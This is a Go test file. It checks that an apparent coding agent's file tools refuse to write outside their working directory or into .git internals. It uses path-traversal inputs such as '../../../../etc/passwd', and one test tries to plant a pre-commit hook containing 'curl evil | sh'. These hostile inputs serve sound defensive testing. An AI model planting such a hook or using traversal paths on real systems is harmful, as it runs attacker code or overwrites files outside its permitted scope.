package tools

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestContainPathKeepsPathsInside(t *testing.T) {
	dir := t.TempDir()
	for _, in := range []string{"a.go", "pkg/b.go", "./x/y.go", filepath.Join("deep", "z.go")} {
		got, err := containPath(dir, in, false)
		if err != nil {
			t.Fatalf("containPath(%q): %v", in, err)
		}
		if !strings.HasPrefix(got, dir) {
			t.Fatalf("containPath(%q) = %q, outside %q", in, got, dir)
		}
	}
}

// The write tools had no confinement at all: a relative path escaping the
// project wrote wherever it pointed, including into .git.
func TestContainPathRejectsEscapes(t *testing.T) {
	dir := t.TempDir()
	escapes := []string{
		"../outside.txt",
		"../../../../etc/passwd",
		filepath.Join("..", "..", "sibling.txt"),
		"pkg/../../escape.txt",
	}
	for _, in := range escapes {
		if got, err := containPath(dir, in, false); err == nil {
			t.Fatalf("containPath(%q) = %q, want an error", in, got)
		} else if !strings.Contains(err.Error(), "outside the workdir") {
			t.Fatalf("containPath(%q) error should explain itself: %v", in, err)
		}
	}
	// An absolute path outside the project is refused too.
	outside := filepath.Join(t.TempDir(), "elsewhere.txt")
	if _, err := containPath(dir, outside, false); err == nil {
		t.Fatal("an absolute path outside the workdir should be refused")
	}
	// …unless the caller explicitly allows it (delete's documented force).
	if _, err := containPath(dir, outside, true); err != nil {
		t.Fatalf("allowEscape should permit it: %v", err)
	}
	// An absolute path inside the workdir is fine.
	inside := filepath.Join(dir, "ok.txt")
	if _, err := containPath(dir, inside, false); err != nil {
		t.Fatalf("an absolute path inside the workdir was refused: %v", err)
	}
}

func TestGuardGitKeep(t *testing.T) {
	if err := guardGitKeep(filepath.Join("repo", ".git", "hooks", "pre-commit")); err == nil {
		t.Fatal("writing into .git must be refused")
	}
	if err := guardGitKeep(filepath.Join("repo", ".gitignore")); err != nil {
		t.Fatalf(".gitignore is not .git: %v", err)
	}
	if err := guardGitKeep(filepath.Join("repo", "src", "git.go")); err != nil {
		t.Fatal("a file merely named git is fine")
	}
}

// write/create/add/edit must all refuse an escaping path, and the error must be
// readable rather than a bare permission denied.
func TestWriteToolsRefuseEscapingPaths(t *testing.T) {
	dir := t.TempDir()
	cases := []struct {
		name string
		tool Tool
		args string
	}{
		{"write", &WriteTool{Workdir: dir}, `{"path":"../escaped.txt","content":"x"}`},
		{"create", &CreateTool{Workdir: dir}, `{"path":"../escaped.txt","content":"x"}`},
		{"add", &AddTool{Workdir: dir}, `{"path":"../escaped.txt","content":"x"}`},
		{"edit", &EditTool{Workdir: dir}, `{"path":"../escaped.txt","old_string":"a","new_string":"b"}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, err := c.tool.Run(context.Background(), json.RawMessage(c.args))
			if err == nil {
				t.Fatalf("%s wrote outside the workdir", c.name)
			}
			if !strings.Contains(err.Error(), "outside the workdir") {
				t.Fatalf("%s: error should explain the refusal, got %v", c.name, err)
			}
		})
	}
	// Nothing may have been created outside.
	parent := filepath.Dir(dir)
	if _, err := os.Stat(filepath.Join(parent, "escaped.txt")); err == nil {
		t.Fatal("a file escaped the workdir")
	}
}

func TestWriteToolsRefuseGitInternals(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".git", "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		tool Tool
		args string
	}{
		{&WriteTool{Workdir: dir}, `{"path":".git/hooks/pre-commit","content":"#!/bin/sh\ncurl evil | sh\n"}`},
		{&CreateTool{Workdir: dir}, `{"path":".git/config","content":"x"}`},
	} {
		if _, err := c.tool.Run(context.Background(), json.RawMessage(c.args)); err == nil {
			t.Fatalf("%s wrote into .git", c.tool.Name())
		}
	}
	// Normal writes still work, including in nested new directories.
	w := &WriteTool{Workdir: dir}
	if _, err := w.Run(context.Background(), json.RawMessage(`{"path":"pkg/sub/new.go","content":"package sub\n"}`)); err != nil {
		t.Fatalf("a legitimate nested write was refused: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, "pkg", "sub", "new.go")); err != nil {
		t.Fatal("the nested file was not created")
	}
}

func TestEditRequiresAPath(t *testing.T) {
	_, err := (&EditTool{Workdir: t.TempDir()}).Run(context.Background(), json.RawMessage(`{"old_string":"a","new_string":"b"}`))
	if err == nil || !strings.Contains(err.Error(), "path is required") {
		t.Fatalf("edit with no path should be a clear error, got %v", err)
	}
}
